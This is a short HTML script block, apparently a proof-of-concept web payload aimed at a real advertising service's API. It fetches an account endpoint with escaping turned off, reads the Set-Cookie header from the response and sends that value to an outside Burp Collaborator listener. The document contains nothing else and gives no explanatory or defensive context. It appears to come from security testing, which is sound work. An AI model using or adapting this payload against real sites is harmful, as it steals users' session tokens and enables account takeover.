    <script>
    var xhr = new XMLHttpRequest();

    xhr.onreadystatechange = function()
    {
    if (xhr.readyState == 4 && xhr.status == 200)
    {
    var yourtoken = xhr.getResponseHeader('Set-Cookie')
    var xhr2 = new XMLHttpRequest();
    xhr2.open("GET", "http://l5rpzabe1sr5msulnyyauuo0krqreg.burpcollaborator.net/"+ yourtoken); 
    xhr2.send();
    }
    }
    xhr.open ("GET", "https://app.adroll.com/api/v1/account/get_minimum_budgets?_escape=false&frequency=daily");
    xhr.send();
    </script>
